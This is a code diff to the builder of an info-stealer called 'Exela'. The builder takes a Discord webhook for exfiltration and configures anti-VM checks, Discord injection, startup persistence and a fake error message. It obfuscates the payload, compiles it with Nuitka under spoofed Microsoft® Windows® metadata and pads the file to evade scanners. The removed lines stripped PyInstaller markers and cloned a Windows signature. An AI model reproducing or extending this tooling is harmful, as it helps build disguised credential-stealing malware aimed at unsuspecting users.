@@ -20,44 +20,35 @@ class Build:
         self.current_path = os.getcwd()
         self.pump = bool()
         self.pumSize = int() #mb
-        self.pyinstaller = "pyinstaller --onefile --noconsole --clean --noconfirm --upx-dir upx-4.0.2-win64 --version-file version.txt"
+        self.NuitkaCommand = 'nuitka --assume-yes-for-downloads --onefile --windows-disable-console --company-name="Exela Corporation" --product-name="Microsoft® Windows® Operating System" --file-version="10.0.19041.746" --file-description="Exela Service" --copyright="© Exela Corporation. All rights reserved"'
     def CallFuncions(self) -> None:
         try:
             self.InstallModules()
             os.system("cls")
             self.GetWebhook()
-            os.system("cls")
             self.GetAntiVm()
-            os.system("cls")
             self.GetDiscordInjection()
-            os.system("cls")
             self.GetStartupMethod()
-            os.system("cls")
             self.GetFakeError()
-            os.system("cls")
             self.GetIcon()
-            os.system("cls")
             self.PumpFile()
-            os.system("cls")
             self.WriteSettings()
             os.system("cls")
             self.ObfuscateFile("Stub.py")
             self.build_file()
-            os.system("cls")
-            
-            os.system("cls")
-            self.ChangeMetaData("dist\\Stub.exe")
+
             if self.pump == True:
-                self.expand_file("dist\\Stub.exe", self.pumSize)
-            self.SignFile()
-            
+                self.expand_file("stub.exe", self.pumSize)
             try:
-                os.remove("Stub.py")
-                os.remove("Stub.spec")
-                shutil.rmtree("dist")
-                shutil.rmtree("build")
+                # delete Junk Files & Directorys
+                shutil.rmtree("stub.onefile-build")
+                shutil.rmtree("stub.dist")
+                shutil.rmtree("stub.build")
+                os.remove("stub.py")
             except:pass
-            print("\n\nfile compiled, close the window")
+            if os.path.exists("stub.exe"):
+                os.rename("stub.exe", "Exela.exe")
+            print("\nfile compiled, close the window")
         except Exception as e:
             ctypes.windll.user32.MessageBoxW(0, f"An error occurred while building your file. error code\n\n{str(e)}", "Error",  0x10)
         else:
@@ -68,69 +59,33 @@ class Build:
         pump_q = str(input("Yes/No (Default size 10 or 11 mb)\nDo u want to pump the file : "))
         if pump_q.lower() == "y" or pump_q.lower() == "yes":
             pump_size = int(input("how much mb size u want to pumps : "))
-            if pump_size > 100:
-                print("max 100 mb")
-            else:
-                self.pump = True
-                self.pumSize = pump_size
+            self.pump = True
+            self.pumSize = pump_size
         else:self.pump = False
     def expand_file(self,file_name, additional_size_mb) -> None:
-        additional_size_bytes = additional_size_mb * 1024 * 1024
+        if os.path.exists(file_name):
+            additional_size_bytes = additional_size_mb * 1024 * 1024
 
-        with open(file_name, 'ab') as file:
-            current_size = file.tell()
-            target_size = current_size + additional_size_bytes
+            with open(file_name, 'ab') as file:
+                current_size = file.tell()
+                target_size = current_size + additional_size_bytes
 
-            empty_bytes = bytearray([0x00] * additional_size_bytes)
-            file.write(empty_bytes)
+                empty_bytes = bytearray([0x00] * additional_size_bytes)
+                file.write(empty_bytes)
 
-            print(f"{additional_size_mb} MB added to {file_name}")
-    def ChangeMetaData(self, path:str) -> None:
-        if os.path.isfile(path):
-            print("Removing EXE Metada")
-            time.sleep(1)
-            self.RemoveMetaData(path)
-
-    def RenameEntryPoint(self, path:str, entryPoint:str) -> None:
-        with open(path, "rb") as file:
-            data = file.read()
-
-        entryPoint = entryPoint.encode()
-        new_entryPoint = b'\x00' + os.urandom(len(entryPoint) - 1)
-        data = data.replace(entryPoint, new_entryPoint)
-
-        with open(path, "wb") as file:
-            file.write(data)
-    def RemoveMetaData(self, path:str) ->None:
-        with open(path, "rb") as file:
-            data = file.read()
-        data = data.replace(b"PyInstaller:", b"PyInstallem:")
-        data = data.replace(b"pyi-runtime-tmpdir", b"bye-runtime-tmpdir")
-        data = data.replace(b"pyi-windows-manifest-filename", b"bye-windows-manifest-filename")
-        start_index = data.find(b"$") + 1
-        end_index = data.find(b"PE\x00\x00", start_index) - 1
-        data = data[:start_index] + bytes([0] * (end_index - start_index))  + data[end_index:]
-        start_index = data.find(b"PE\x00\x00") + 8
-        end_index = start_index + 4
-        data = data[:start_index] + bytes([0] * (end_index - start_index))  + data[end_index:]
-        with open(path, "wb") as file:
-            file.write(data)
-            del data
+                print(f'{additional_size_mb} MB added to "{os.path.join(self.current_path, file_name)}"')
     def build_file(self) -> None:
-        os.system(self.pyinstaller)
+        os.system(self.NuitkaCommand)
     def InstallModules(self) -> None:
         os.system("pip install cryptography")
         os.system("pip install aiohttp")
-        os.system("pip install pyinstaller")
+        os.system("pip install nuitka")
     def WriteSettings(self) -> None:
         with open("Exela.py", "r", encoding="utf-8", errors="ignore") as file:
             data = file.read()
         replaced_data = data.replace("%WEBHOOK%", str(self.webhook)).replace('"%Anti_VM%"', str(self.Anti_VM)).replace('"%injection%"', str(self.injection)).replace("%startup_method%", str(self.StartupMethod)).replace('"%fake_error%"', str(self.fakeError))
         with open("Stub.py", "w", encoding="utf-8", errors="ignore") as laquica:
             laquica.write(replaced_data)
-    def SignFile(self) -> None:
-        signed_file = os.path.join(self.current_path, "Signed", "Windows10Upgrade9252.exe")
-        os.system(f'python digital-sign.py -i "{signed_file}" -t "{os.path.join(self.current_path, "dist", "Stub.exe")}" -o Exela.exe')
     def ObfuscateFile(self, input_file) -> None:
         obf_file = os.path.join(self.current_path, "Obfuscator", "obf.py")
         os.system(f'python "{obf_file}" --junk "{input_file}"')
@@ -140,19 +95,19 @@ class Build:
             get_icon_path = str(input("icon file must be .ico otherwise the icon will not change\nEnter the path of the icon file : "))
             if not get_icon_path.endswith(".ico"):
                 print("pls use .ico file, now icon change has been disabled")
-                self.pyinstaller += "--icon=NONE stub.py"
+                self.NuitkaCommand += " stub.py"
             else:
                 if not os.path.isfile(get_icon_path):
                     print("file does not exist, icon change has been disabled.")
-                    self.pyinstaller += "--icon=NONE stub.py"
+                    self.NuitkaCommand += " stub.py"
                 else:
                     if self.CheckIcoFile(get_icon_path):
-                        self.pyinstaller += f" --icon={get_icon_path} Stub.py"
+                        self.NuitkaCommand += f" --windows-icon-from-ico={get_icon_path} stub.py"
                     else:
                         print("Your file doesnt current a ico file, icon change has been disabled")
-                        self.pyinstaller += "--icon=NONE stub.py"
+                        self.NuitkaCommand += " stub.py"
         else:
-            self.pyinstaller += " --icon=NONE Stub.py"
+            self.NuitkaCommand += " stub.py"
     def CheckIcoFile(self, file_path:str) -> bool:
         try:
             ico_header = b'\x00\x00\x01\x00' # ico header
@@ -175,10 +130,10 @@ class Build:
         web = str(input("Enter your webhook URL : "))
         if not "/api/webhooks/" in web:
             print("invalid webhook URL")
-            os._exit(0)
+            while True:continue
         if not web.startswith("https://"):
             print("use with https URL not http")
-            os._exit(0)
+            while True:continue
         else:
              self.webhook=web
     def GetAntiVm(self) -> None:
